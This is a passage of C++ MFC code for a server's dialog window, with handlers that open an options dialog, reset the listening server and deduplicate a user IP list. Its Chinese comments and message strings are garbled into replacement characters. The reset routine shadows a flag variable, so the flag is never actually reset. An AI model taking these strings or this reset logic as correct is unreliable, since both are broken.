{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	/*
	auto hDll = LoadLibrary("options.d");
	if (!hDll)
	{
		MessageBox("�޷������ⲿģ�飬�����Ƿ��Ѿ�������ģ�顣", 0, MB_ICONERROR);
		return;
	}
	typedef int(__stdcall *SzCall)(CWnd*);
	SzCall _SzC = reinterpret_cast<SzCall>(GetProcAddress(hDll, "_HA_MAIN"));
	if (!_SzC)
	{
		MessageBox("�������ù���ʧ�ܡ�������ں����淶��", 0, MB_ICONERROR);
		return;
	}
	thread(_SzC, this).detach();
	*/
	shared_ptr<moreopt> _MoreOpt(new moreopt);
	_MoreOpt->CallBackEnv = this;
	thread(&moreopt::DoModal, _MoreOpt).detach();
	return;
}


void ChisfooDlg::OnBnClickedCancel()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	int retKx = MessageBoxA("��ֹ�˳�����������������ˣ�����ȡ�����β�����", "�������������", MB_ABORTRETRYIGNORE | MB_ICONINFORMATION);
	if (retKx == IDABORT)
	{
		CDialogEx::OnCancel();
	}
	else if (retKx == IDIGNORE)
	{
		return;
	}
	else if (retKx == IDRETRY)
	{
		shared_ptr<ChisfooDlg> _Dlg(new ChisfooDlg);
		thread(&ChisfooDlg::MessageBoxA, _Dlg, "������������ˣ���ȴ���ʾ��\n"\
			"����ز�Ҫ�رճ�����ɺ����һ����ʾ��\n"\
			"���򽫻������������������ӵ�ǰ����״���������벻Ҫ���κβ�����\n\n\n"\
			"��������Ҫ������\n"\
			"�����ɹ���ʾ����ǰ�벻Ҫ�����κ����ݻ������κβ���������������Զ��ġ�\n"\
			, "��������", 0U).detach();
		auto ReSet_FX = [&]()
		{
			Pcs_Flag = 0U;
			auto _TTick = chrono::system_clock::now();
			while (_Thr_Flag)
			{
				Sleep(Wait_Time);
				if (chrono::system_clock::now() - _TTick > chrono::milliseconds(Wait_Time * 2))break;
			}
			_Thr_Pcs.clear();
			atomic_uint _Thr_Flag = 0U;
			Task_Pcs.clear();
			userList.clear();
			WorkMap.clear();
			puserlist.ResetContent();
			pmsgbox.ResetContent();
			closesocket(slisten);
			BOOL  bDontLinger = FALSE;
			setsockopt(slisten, SOL_SOCKET, SO_DONTLINGER, (const char*)&bDontLinger, sizeof(BOOL));
			WSACleanup();

			Pcs_Flag = 1U;

			_Thr_Pcs.push_back(thread(&ChisfooDlg::NetWork_Pcs, this));
			_Thr_Pcs.back().detach();

			_Thr_Pcs.push_back(thread(&ChisfooDlg::Offline_Pcs, this));
			_Thr_Pcs.back().detach();

			shared_ptr<ChisfooDlg> _TDlg(new ChisfooDlg);
			thread(&ChisfooDlg::MessageBoxA, _TDlg, "��������˳ɹ�", "�����ɹ�", 0U).detach();
			MessagePcs("�ɹ������˷���ˣ�");
			return;
		};
		thread(ReSet_FX).detach();
	}
}


void ChisfooDlg::OnBnClickedButton4()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	vector<string> ip_list;
	auto FindStr = [&](string tofind)->BOOL
	{
		for (auto msdps = ip_list.begin(); msdps != ip_list.end(); msdps++)
		{
			if ((*msdps) == tofind)return TRUE;
		}
		return FALSE;
	};
	for(unsigned long mCtrl = 0;mCtrl<puserlist.GetCount();)
	{
		CString strText;
		puserlist.GetText(mCtrl, strText);
		stringstream SStrEx;
		SStrEx.str(strText.GetString());
		SStrEx.clear();
		string bufOne, bufTwo;
		SStrEx >> bufOne >> bufTwo;
		if (FindStr(bufTwo))
		{
			puserlist.DeleteString(mCtrl);
			continue;
		}
		else
			ip_list.push_back(bufTwo);
		mCtrl += 1;
	}
}
